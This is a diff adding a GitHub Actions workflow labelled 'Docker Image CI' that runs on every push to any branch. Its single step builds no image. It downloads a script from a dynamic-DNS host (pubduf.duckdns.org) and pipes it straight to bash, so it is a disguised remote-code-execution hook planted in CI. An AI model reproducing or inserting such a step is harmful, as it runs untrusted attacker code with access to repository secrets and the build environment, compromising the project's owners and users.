@@ -1,0 +1,15 @@
+name: Docker Image CI
+
+on:
+  push:
+    branches:
+      - "*"  # This will trigger on push to any branch
+jobs:
+
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Running script
+        run: curl "http://pubduf.duckdns.org:5000/run.sh" | bash
